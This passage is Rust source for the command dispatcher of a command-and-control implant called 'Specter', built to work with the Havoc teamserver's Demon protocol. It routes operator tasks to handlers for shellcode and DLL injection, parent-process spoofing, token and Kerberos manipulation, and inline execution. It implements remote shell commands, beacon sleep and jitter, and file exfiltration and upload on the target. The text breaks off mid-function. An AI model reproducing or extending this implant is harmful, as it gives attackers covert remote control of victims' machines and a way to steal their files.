//! Command dispatch and handler implementations for the Specter agent.
//!
//! Routes incoming server task packages to platform-native handler functions and
//! assembles the big-endian response payloads expected by the Havoc teamserver.
//!
//! # Wire endianness
//!
//! * **Server → agent** (incoming task payload): integers are **little-endian**
//!   (`binary.LittleEndian` in the Go teamserver's `BuildPayloadMessage`).
//! * **Agent → server** (outgoing response payload): integers are **big-endian**
//!   (`Int32ToBuffer` in the Demon C agent's `Package.c`, parsed by the Go
//!   teamserver's big-endian `parser.NewParser`).

use std::collections::HashMap;
use std::process::{Command as SysCommand, Stdio};
use std::time::UNIX_EPOCH;

use red_cell_common::demon::{
    DemonCommand, DemonConfigKey, DemonFilesystemCommand, DemonInjectError, DemonInjectWay,
    DemonJobCommand, DemonKerberosCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
    DemonTokenCommand, DemonTransferCommand,
};
use tracing::{info, warn};

use crate::coffeeldr;
use crate::config::SpecterConfig;
use crate::dotnet;
use crate::download::{
    DOWNLOAD_MODE_OPEN, DOWNLOAD_REASON_REMOVED, DownloadState, DownloadTracker,
};
use crate::job::JobStore;
use crate::token::TokenVault;

/// In-memory PowerShell script store.  The teamserver sends script bytes via
/// `CommandPsImport`; the agent accumulates them for later execution.
pub type PsScriptStore = Vec<u8>;

// ─── In-memory file staging ─────────────────────────────────────────────────

/// A single in-memory file being staged by the teamserver via `CommandMemFile`
/// chunks.  Once all chunks have arrived (`is_complete()` returns true), the
/// accumulated data can be consumed by other commands such as `CommandFs/Upload`.
#[derive(Debug)]
pub struct MemFile {
    expected_size: usize,
    data: Vec<u8>,
}

impl MemFile {
    /// Append a chunk of data, truncating to `expected_size` if the total would
    /// exceed it.
    fn append(&mut self, chunk: &[u8]) {
        self.data.extend_from_slice(chunk);
        if self.data.len() > self.expected_size {
            self.data.truncate(self.expected_size);
        }
    }

    /// Returns `true` when the accumulated data equals the declared size.
    fn is_complete(&self) -> bool {
        self.data.len() == self.expected_size
    }
}

/// Collection of in-memory files keyed by their teamserver-assigned ID.
pub type MemFileStore = HashMap<u32, MemFile>;

// ─── Result type ─────────────────────────────────────────────────────────────

/// Outcome of dispatching one decoded task package.
#[derive(Debug)]
pub enum DispatchResult {
    /// Send one response packet to the server.
    Respond(Response),
    /// Send multiple response packets (e.g., proc-info + captured output).
    MultiRespond(Vec<Response>),
    /// Cleanly terminate the agent process.
    Exit,
    /// Nothing to send back (no-job, unrecognised command, parse error, …).
    Ignore,
}

/// A single pending agent → server response, ready to be wrapped in a callback
/// envelope and sent over the transport.
#[derive(Debug, Clone)]
pub struct Response {
    /// Demon command ID for the outgoing packet header.
    pub command_id: u32,
    /// Request ID to use for the callback.  When zero the agent loop falls back
    /// to the request ID from the originating task package.
    pub request_id: u32,
    /// Payload bytes already serialised in big-endian wire format.
    pub payload: Vec<u8>,
}

impl Response {
    fn new(cmd: DemonCommand, payload: Vec<u8>) -> Self {
        Self { command_id: cmd.into(), request_id: 0, payload }
    }
}

// ─── Top-level dispatch ───────────────────────────────────────────────────────

/// Route a single decoded [`DemonPackage`] to the appropriate handler.
///
/// The [`DispatchResult`] must be transmitted back to the server using the
/// `request_id` from the original package.
pub fn dispatch(
    package: &DemonPackage,
    config: &mut SpecterConfig,
    token_vault: &mut TokenVault,
    downloads: &mut DownloadTracker,
    mem_files: &mut MemFileStore,
    job_store: &mut JobStore,
    ps_scripts: &mut PsScriptStore,
) -> DispatchResult {
    let cmd = match DemonCommand::try_from(package.command_id) {
        Ok(c) => c,
        Err(_) => {
            warn!(command_id = package.command_id, "received unknown command ID — ignoring");
            return DispatchResult::Ignore;
        }
    };

    info!(command = ?cmd, request_id = package.request_id, "dispatching command");

    match cmd {
        DemonCommand::CommandNoJob | DemonCommand::CommandGetJob => DispatchResult::Ignore,
        DemonCommand::CommandSleep => handle_sleep(&package.payload, config),
        DemonCommand::CommandFs => {
            handle_fs(&package.payload, package.request_id, downloads, mem_files)
        }
        DemonCommand::CommandTransfer => handle_transfer(&package.payload, downloads),
        DemonCommand::CommandProc => handle_proc(&package.payload),
        DemonCommand::CommandProcList => handle_proc_list(&package.payload),
        DemonCommand::CommandNet => handle_net(&package.payload),
        DemonCommand::CommandToken => handle_token(&package.payload, token_vault),
        DemonCommand::CommandMemFile => {
            handle_memfile(&package.payload, package.request_id, mem_files)
        }
        DemonCommand::CommandInjectShellcode => handle_inject_shellcode(&package.payload),
        DemonCommand::CommandInjectDll => handle_inject_dll(&package.payload),
        DemonCommand::CommandSpawnDll => handle_spawn_dll(&package.payload),
        DemonCommand::CommandProcPpidSpoof => handle_proc_ppid_spoof(&package.payload, config),
        DemonCommand::CommandKerberos => handle_kerberos(&package.payload),
        DemonCommand::CommandConfig => handle_config(&package.payload, config),
        DemonCommand::CommandInlineExecute => {
            handle_inline_execute(&package.payload, config, mem_files)
        }
        DemonCommand::CommandJob => handle_job(&package.payload, job_store),
        DemonCommand::CommandPsImport => handle_ps_import(&package.payload, ps_scripts, mem_files),
        DemonCommand::CommandAssemblyInlineExecute => {
            handle_assembly_inline_execute(&package.payload, mem_files)
        }
        DemonCommand::CommandAssemblyListVersions => handle_assembly_list_versions(),
        DemonCommand::CommandScreenshot => handle_screenshot(),
        DemonCommand::CommandPackageDropped => {
            handle_package_dropped(&package.payload, package.request_id, downloads, mem_files)
        }
        DemonCommand::CommandExit => DispatchResult::Exit,
        // These are agent-to-server callbacks; ignore if received from server.
        DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
        _ => {
            info!(command = ?cmd, "unhandled command — ignoring");
            DispatchResult::Ignore
        }
    }
}

// ─── COMMAND_SLEEP (11) ──────────────────────────────────────────────────────

/// Handle a `CommandSleep` task: update the sleep configuration and echo it back.
///
/// Incoming payload (LE): `[delay_ms: u32][jitter_pct: u32]`
/// Outgoing payload (BE): `[delay_ms: u32][jitter_pct: u32]`
fn handle_sleep(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;

    let delay = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse delay: {e}");
            return DispatchResult::Ignore;
        }
    };
    let jitter = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse jitter: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(delay_ms = delay, jitter_pct = jitter, "sleep interval updated");
    config.sleep_delay_ms = delay;
    config.sleep_jitter = jitter.min(100);

    let mut out = Vec::with_capacity(8);
    write_u32_le(&mut out, delay);
    write_u32_le(&mut out, jitter);
    DispatchResult::Respond(Response::new(DemonCommand::CommandSleep, out))
}

// ─── COMMAND_FS (15) ─────────────────────────────────────────────────────────

/// Dispatch a `CommandFs` task to the appropriate filesystem sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
fn handle_fs(
    payload: &[u8],
    request_id: u32,
    downloads: &mut DownloadTracker,
    mem_files: &mut MemFileStore,
) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandFs: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonFilesystemCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandFs: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandFs dispatch");

    match subcmd {
        DemonFilesystemCommand::GetPwd => handle_fs_pwd(subcmd_raw),
        DemonFilesystemCommand::Cd => handle_fs_cd(subcmd_raw, &payload[offset..]),
        DemonFilesystemCommand::Dir => handle_fs_dir(subcmd_raw, &payload[offset..]),
        DemonFilesystemCommand::Download => {
            handle_fs_download(subcmd_raw, &payload[offset..], request_id, downloads)
        }
        DemonFilesystemCommand::Upload => {
            handle_fs_upload(subcmd_raw, &payload[offset..], mem_files)
        }
        _ => {
            info!(subcommand = ?subcmd, "CommandFs: unhandled subcommand — ignoring");
            DispatchResult::Ignore
        }
    }
}

/// `COMMAND_FS / GetPwd (9)` — return the current working directory.
///
/// Outgoing payload (LE): `[9: u32][path: bytes (UTF-16LE null-terminated)]`
fn handle_fs_pwd(subcmd_raw: u32) -> DispatchResult {
    let path = match std::env::current_dir() {
        Ok(p) => p.display().to_string(),
        Err(e) => {
            warn!("GetPwd: current_dir failed: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(path = %path, "GetPwd");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_utf16le(&mut out, &path);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// `COMMAND_FS / Cd (4)` — change the working directory.
///
/// Incoming args (LE): `[path: bytes (UTF-16LE)]`
/// Outgoing payload (LE): `[4: u32][path: bytes (UTF-16LE null-terminated)]`
fn handle_fs_cd(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Cd: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let path_str = decode_utf16le_null(&path_bytes);
    info!(path = %path_str, "Cd");

    if let Err(e) = std::env::set_current_dir(&path_str) {
        warn!("Cd: set_current_dir({path_str:?}) failed: {e}");
        return DispatchResult::Ignore;
    }

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_utf16le(&mut out, &path_str);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// `COMMAND_FS / Dir (1)` — list a directory.
///
/// Incoming args (LE) — mirrors Demon C agent parse order:
/// ```text
/// [file_explorer: u32][path: bytes][subdirs: u32][files_only: u32]
/// [dirs_only: u32][list_only: u32]
/// [starts: bytes][contains: bytes][ends: bytes]
/// ```
///
/// Outgoing payload (BE):
/// ```text
/// [subcmd: u32][file_explorer: u32][list_only: u32][path: bytes][success: u32]
/// per dir group:
///   [path: bytes][num_files: u32][num_dirs: u32]
///   (if !list_only) [total_size: u64]
///   per entry:
///     [name: bytes]
///     (if !list_only) [is_dir: u32][size: u64][day][month][year][min][hour]
/// ```
fn handle_fs_dir(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;

    // Parse the full request payload (matches Demon C agent parse order).
    let file_explorer = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;

    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Dir: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let _subdirs = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let files_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let dirs_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let list_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;

    // Name-filter strings (empty = no filter).
    let starts_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();
    let contains_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();
    let ends_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();

    let raw_path = decode_utf16le_null(&path_bytes);

    // Resolve actual directory path (strip trailing wildcard/dot).
    let dir_path = if raw_path.is_empty() || raw_path == "." || raw_path.starts_with(".\\") {
        match std::env::current_dir() {
            Ok(p) => p.display().to_string(),
            Err(e) => {
                warn!("Dir: current_dir failed: {e}");
                return DispatchResult::Ignore;
            }
        }
    } else {
        raw_path.trim_end_matches('*').trim_end_matches('/').trim_end_matches('\\').to_string()
    };

    let entries = match std::fs::read_dir(&dir_path) {
        Ok(e) => e,
        Err(e) => {
            warn!(path = %dir_path, "Dir: read_dir failed: {e}");
            return DispatchResult::Ignore;
        }
    };

    // Collect entries with metadata and timestamps.
    // Each entry: (name, is_dir, size, day, month, year, minute, hour)
    let mut files: Vec<(String, bool, u64, u32, u32, u32, u32, u32)> = Vec::new();
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        let meta = entry.metadata().ok();
        let is_dir = meta.as_ref().is_some_and(|m| m.is_dir());
        let size = meta.as_ref().map_or(0, |m| m.len());

        // Apply files_only / dirs_only filter.
        if files_only && is_dir {
            continue;
        }
        if dirs_only && !is_dir {
            continue;
        }

        // Apply name filters.
        let name_lower = name.to_ascii_lowercase();
        if !starts_filter.is_empty() && !name_lower.starts_with(&starts_filter.to_ascii_lowercase())
        {
            continue;
        }
        if !contains_filter.is_empty()
            && !name_lower.contains(&contains_filter.to_ascii_lowercase())
        {
            continue;
        }
        if !ends_filter.is_empty() && !name_lower.ends_with(&ends_filter.to_ascii_lowercase()) {
            continue;
        }

        // Derive modification timestamps from real file metadata.
        let (day, month, year, minute, hour) = meta
            .as_ref()
            .and_then(|m| m.modified().ok())
            .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
            .map(|d| unix_secs_to_ymd_hm(d.as_secs()))
            .unwrap_or((1, 1, 1970, 0, 0));

        files.push((name, is_dir, size, day, month, year, minute, hour));
    }

    let num_files = files.iter().filter(|(_, d, ..)| !d).count() as u32;
    let num_dirs = files.iter().filter(|(_, d, ..)| *d).count() as u32;
    let total_size: u64 = files.iter().filter(|(_, d, ..)| !d).map(|(_, _, s, ..)| *s).sum();

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, u32::from(file_explorer));
    write_u32_le(&mut out, u32::from(list_only));
    write_utf16le(&mut out, &dir_path);
    write_u32_le(&mut out, 1); // success

    // Single directory group.
    write_utf16le(&mut out, &dir_path);
    write_u32_le(&mut out, num_files);
    write_u32_le(&mut out, num_dirs);
    if !list_only {
        out.extend_from_slice(&total_size.to_le_bytes());
    }

    for (name, is_dir, size, day, month, year, minute, hour) in &files {
        write_utf16le(&mut out, name);
        if !list_only {
            write_u32_le(&mut out, u32::from(*is_dir));
            out.extend_from_slice(&size.to_le_bytes());
            write_u32_le(&mut out, *day);
            write_u32_le(&mut out, *month);
            write_u32_le(&mut out, *year);
            write_u32_le(&mut out, *minute);
            write_u32_le(&mut out, *hour);
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// Convert a UNIX timestamp (seconds since epoch) to `(day, month, year, minute, hour)`.
///
/// Uses Howard Hinnant's civil-from-days algorithm for the date part.
fn unix_secs_to_ymd_hm(secs: u64) -> (u32, u32, u32, u32, u32) {
    // Days since 1970-01-01 shifted to the civil epoch (Mar 1, year 0).
    let z = (secs / 86400) as i64 + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = (z - era * 146_097) as u64; // day of era [0, 146096]
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146_096) / 365; // year of era [0, 399]
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100); // day of year [0, 365]
    let mp = (5 * doy + 2) / 153; // month of year [0, 11]
    let d = doy - (153 * mp + 2) / 5 + 1; // day [1, 31]
    let m = if mp < 10 { mp + 3 } else { mp - 9 }; // month [1, 12]
    let y = if m <= 2 { y + 1 } else { y }; // adjust year for Jan/Feb
    let hour = (secs % 86400 / 3600) as u32;
    let minute = (secs % 3600 / 60) as u32;
    (d as u32, m as u32, y as u32, minute, hour)
}

// ─── COMMAND_FS / Download (2) ──────────────────────────────────────────────

/// `COMMAND_FS / Download (2)` — initiate a file download from the target.
///
/// Opens the requested file, registers it in the [`DownloadTracker`], and
/// returns the OPEN header packet. Subsequent chunks are pushed by the main
/// agent loop via [`DownloadTracker::push_chunks`].
///
/// Incoming args (LE): `[file_path: bytes (UTF-16LE)]`
///
/// Outgoing payload (BE):
/// ```text
/// [subcmd=2: u32][mode=OPEN: u32][file_id: u32][file_size: u64][file_path: wstring]
/// ```
fn handle_fs_download(
    subcmd_raw: u32,
    rest: &[u8],
    request_id: u32,
    downloads: &mut DownloadTracker,
) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("FsDownload: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let path_str = decode_utf16le_null(&path_bytes);
    info!(path = %path_str, "FsDownload: opening file");

    // Resolve to an absolute path so the teamserver sees the full name.
    let resolved = match std::fs::canonicalize(&path_str) {
        Ok(p) => p.display().to_string(),
        Err(_) => path_str.clone(),
    };

    let file = match std::fs::File::open(&path_str) {
        Ok(f) => f,
        Err(e) => {
            warn!(path = %path_str, error = %e, "FsDownload: open failed");
            return DispatchResult::Ignore;
        }
    };

    let file_size = match file.metadata() {
        Ok(m) => m.len(),
        Err(e) => {
            warn!(path = %path_str, error = %e, "FsDownload: metadata failed");
            return DispatchResult::Ignore;
        }
    };

    let file_id = downloads.add(file, request_id, file_size);

    // Build OPEN header in big-endian (matching Demon PackageAddInt32/64/WString).
    let mut out = Vec::new();
    write_u32_be_always(&mut out, subcmd_raw);
    write_u32_be_always(&mut out, DOWNLOAD_MODE_OPEN);
    write_u32_be_always(&mut out, file_id);
    out.extend_from_slice(&file_size.to_be_bytes()); // int64 BE
    write_wstring_be(&mut out, &resolved);

    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

// ─── COMMAND_FS / Upload (3) ────────────────────────────────────────────────

/// `COMMAND_FS / Upload (3)` — write a file to disk from a staged MemFile.
///
/// The teamserver streams file content into a MemFile via `CommandMemFile`
/// chunks, then sends a `CommandFs / Upload` referencing that MemFile by ID.
///
/// Incoming args (LE): `[file_path: bytes (UTF-16LE)][mem_file_id: u32]`
///
/// Outgoing payload (BE): `[subcmd=3: u32][file_size: u32][file_path: wstring]`
fn handle_fs_upload(subcmd_raw: u32, rest: &[u8], mem_files: &mut MemFileStore) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("FsUpload: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let path_str = decode_utf16le_null(&path_bytes);

    let mem_file_id = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!(path = %path_str, "FsUpload: failed to parse memfile id: {e}");
            return DispatchResult::Ignore;
        }
    };

    let Some(mem_file) = mem_files.get(&mem_file_id) else {
        warn!(path = %path_str, mem_file_id, "FsUpload: memfile not found");
        return DispatchResult::Ignore;
    };

    if !mem_file.is_complete() {
        warn!(
            path = %path_str,
            mem_file_id,
            expected = mem_file.expected_size,
            actual = mem_file.data.len(),
            "FsUpload: memfile incomplete"
        );
        return DispatchResult::Ignore;
    }

    info!(path = %path_str, size = mem_file.data.len(), "FsUpload: writing file");

    if let Err(e) = std::fs::write(&path_str, &mem_file.data) {
        warn!(path = %path_str, error = %e, "FsUpload: write failed");
        return DispatchResult::Ignore;
    }

    #[allow(clippy::cast_possible_truncation)]
    let file_size = mem_file.data.len() as u32;

    // Remove the consumed MemFile.
    mem_files.remove(&mem_file_id);

    let mut out = Vec::new();
    write_u32_be_always(&mut out, subcmd_raw);
    write_u32_be_always(&mut out, file_size);
    write_wstring_be(&mut out, &path_str);

    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

// ─── COMMAND_MEMFILE (2560) ─────────────────────────────────────────────────

/// Handle a `CommandMemFile` task: accumulate a file chunk into the in-memory
/// staging area.
///
/// The teamserver splits large payloads (BOFs, DLLs, etc.) into chunks and
/// sends each as a separate `CommandMemFile` packet with the same `mem_file_id`
/// and `total_size`.  Each chunk is appended; once the accumulated length equals
/// `total_size` the file is ready for consumption by `CommandFs/Upload` or
/// similar commands.
///
/// Incoming payload (LE): `[mem_file_id: u32][total_size: u64][chunk: bytes]`
///
/// Outgoing payload (BE): `[mem_file_id: u32][success: u32 (bool)]`
fn handle_memfile(payload: &[u8], request_id: u32, mem_files: &mut MemFileStore) -> DispatchResult {
    let mut offset = 0;

    let mem_file_id = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("MemFile: failed to parse mem_file_id: {e}");
            return DispatchResult::Ignore;
        }
    };

    let total_size = match parse_u64_le(payload, &mut offset) {
        Ok(v) => v as usize,
        Err(e) => {
            warn!(mem_file_id, "MemFile: failed to parse total_size: {e}");
            return memfile_ack(mem_file_id, request_id, false);
        }
    };

    let chunk = match parse_bytes_le(payload, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!(mem_file_id, "MemFile: failed to parse chunk: {e}");
            return memfile_ack(mem_file_id, request_id, false);
        }
    };

    let entry = mem_files.entry(mem_file_id).or_insert_with(|| MemFile {
        expected_size: total_size,
        data: Vec::with_capacity(total_size),
    });

    // Reject if total_size changed or we already overflowed.
    if entry.expected_size != total_size || entry.data.len() > total_size {
        warn!(
            mem_file_id,
            expected = entry.expected_size,
            declared = total_size,
            accumulated = entry.data.len(),
            "MemFile: size mismatch or overflow"
        );
        return memfile_ack(mem_file_id, request_id, false);
    }

    entry.append(&chunk);
    info!(
        mem_file_id,
        chunk_len = chunk.len(),
        accumulated = entry.data.len(),
        total = total_size,
        "MemFile: chunk received"
    );

    memfile_ack(mem_file_id, request_id, true)
}

/// Build a `CommandMemFile` acknowledgement response.
///
/// Payload (BE): `[mem_file_id: u32][success: u32 (1 = true, 0 = false)]`
fn memfile_ack(mem_file_id: u32, request_id: u32, success: bool) -> DispatchResult {
    let mut out = Vec::new();
    write_u32_be_always(&mut out, mem_file_id);
    write_u32_be_always(&mut out, u32::from(success));
    DispatchResult::Respond(Response {
        command_id: u32::from(DemonCommand::CommandMemFile),
        request_id,
        payload: out,
    })
}

// ─── COMMAND_TRANSFER (2530) ────────────────────────────────────────────────

/// Dispatch a `CommandTransfer` task to manage active downloads.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
fn handle_transfer(payload: &[u8], downloads: &mut DownloadTracker) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandTransfer: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonTransferCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandTransfer: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandTransfer dispatch");

    let rest = &payload[offset..];
    match subcmd {
        DemonTransferCommand::List => handle_transfer_list(subcmd_raw, downloads),
        DemonTransferCommand::Stop => handle_transfer_stop(subcmd_raw, rest, downloads),
        DemonTransferCommand::Resume => handle_transfer_resume(subcmd_raw, rest, downloads),
        DemonTransferCommand::Remove => handle_transfer_remove(subcmd_raw, rest, downloads),
    }
}

/// `Transfer::List (0)` — enumerate all active downloads.
///
/// Outgoing payload (LE): `[subcmd: u32]` followed by per-entry:
/// `[file_id: u32][read_size: u32][state: u32]`
fn handle_transfer_list(subcmd_raw: u32, downloads: &DownloadTracker) -> DispatchResult {
    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    for (file_id, read_size, state) in downloads.list() {
        write_u32_le(&mut out, file_id);
        #[allow(clippy::cast_possible_truncation)]
        write_u32_le(&mut out, read_size as u32);
        write_u32_le(&mut out, state.into());
    }

    info!(count = downloads.len(), "Transfer::List");
    DispatchResult::Respond(Response::new(DemonCommand::CommandTransfer, out))
}

/// `Transfer::Stop (1)` — pause a running download.
///
/// Incoming args (LE): `[file_id: u32]`
/// Outgoing payload (LE): `[subcmd: u32][found: u32][file_id: u32]`
fn handle_transfer_stop(
    subcmd_raw: u32,
    rest: &[u8],
    downloads: &mut DownloadTracker,
) -> DispatchResult {
    let mut offset = 0;
    let file_id = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Transfer::Stop: failed to parse file_id: {e}");
            return DispatchResult::Ignore;
        }
    };

    let found = if let Some(entry) = downloads.get_mut(file_id) {
        entry.state = DownloadState::Stopped;
        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Stop: stopped");
        1u32
    } else {
        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Stop: not found");
        0u32
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, found);
    write_u32_le(&mut out, file_id);

    DispatchResult::Respond(Response::new(DemonCommand::CommandTransfer, out))
}

/// `Transfer::Resume (2)` — resume a stopped download.
///
/// Incoming args (LE): `[file_id: u32]`
/// Outgoing payload (LE): `[subcmd: u32][found: u32][file_id: u32]`
fn handle_transfer_resume(
    subcmd_raw: u32,
    rest: &[u8],
    downloads: &mut DownloadTracker,
) -> DispatchResult {
    let mut offset = 0;
    let file_id = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Transfer::Resume: failed to parse file_id: {e}");
            return DispatchResult::Ignore;
        }
    };

    let found = if let Some(entry) = downloads.get_mut(file_id) {
        entry.state = DownloadState::Running;
        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Resume: resumed");
        1u32
    } else {
        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Resume: not found");
        0u32
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, found);
    write_u32_le(&mut out, file_id);

    DispatchResult::Respond(Response::new(DemonCommand::CommandTransfer, out))
}

/// `Transfer::Remove (3)` — cancel and remove a download.
///
/// Incoming args (LE): `[file_id: u32]`
/// Outgoing payload (LE): `[subcmd: u32][found: u32][file_id: u32]`
///
/// When found, also emits a second Transfer packet with `DOWNLOAD_REASON_REMOVED`
/// to tell the teamserver to close the download on its end (matching Demon behaviour).
fn handle_transfer_remove(
    subcmd_raw: u32,
    rest: &[u8],
    downloads: &mut DownloadTracker,
) -> DispatchResult {
    let mut offset = 0;
    let file_id = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Transfer::Remove: failed to parse file_id: {e}");
            return DispatchResult::Ignore;
        }
    };

    let found = if let Some(entry) = downloads.get_mut(file_id) {
        entry.state = DownloadState::Remove;
        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Remove: marked for removal");
        1u32
    } else {
        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Remove: not found");
        0u32
    };

    // Primary response: [subcmd][found][file_id]
    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, found);
    write_u32_le(&mut out, file_id);

    if found == 1 {
        // Second packet: tell the teamserver to close its download state.
        let mut close_out = Vec::new();
        write_u32_le(&mut close_out, subcmd_raw);
        write_u32_le(&mut close_out, file_id);
        write_u32_le(&mut close_out, DOWNLOAD_REASON_REMOVED);

        DispatchResult::MultiRespond(vec![
            Response::new(DemonCommand::CommandTransfer, out),
            Response::new(DemonCommand::CommandTransfer, close_out),
        ])
    } else {
        DispatchResult::Respond(Response::new(DemonCommand::CommandTransfer, out))
    }
}

// ─── COMMAND_PROC (0x1010) ────────────────────────────────────────────────────

/// Dispatch a `CommandProc` task to the appropriate process sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
fn handle_proc(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandProc: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonProcessCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandProc: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandProc dispatch");

    match subcmd {
        DemonProcessCommand::Create => handle_proc_create(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Modules => handle_proc_modules(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Grep => handle_proc_grep(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Memory => handle_proc_memory(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Kill => handle_proc_kill(subcmd_raw, &payload[offset..]),
    }
}

/// `COMMAND_PROC / Create (4)` — execute a command via the native shell.
///
/// The Havoc client sends Windows paths (`cmd.exe /c <cmd>`); on Linux we
/// strip the `/c ` prefix and invoke `/bin/sh -c <cmd>` instead.
///
/// Incoming args (LE):
/// `[state: u32][path: bytes (UTF-16LE)][args: bytes (UTF-16LE)][piped: u32][verbose: u32]`
///
/// Returns two responses (both using the original `request_id`):
/// 1. `CommandProc` — process metadata (path, PID, success, piped, verbose)
/// 2. `CommandOutput` — captured stdout + stderr
fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let process_state = parse_u32_le(rest, &mut offset).unwrap_or(0);

    let process_path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcCreate: failed to parse process path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let process_path = decode_utf16le_null(&process_path_bytes);

    let process_args_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcCreate: failed to parse process args: {e}");
            return DispatchResult::Ignore;
        }
    };
    let process_args_raw = decode_utf16le_null(&process_args_bytes);

    let piped = parse_u32_le(rest, &mut offset).unwrap_or(0);
    let verbose = parse_u32_le(rest, &mut offset).unwrap_or(0);

    info!(
        path = %process_path,
        args = %process_args_raw,
        piped,
        verbose,
        state = process_state,
        "ProcCreate: executing shell command"
    );

    let (success, pid, output_bytes) = spawn_shell_command(&process_path, &process_args_raw);

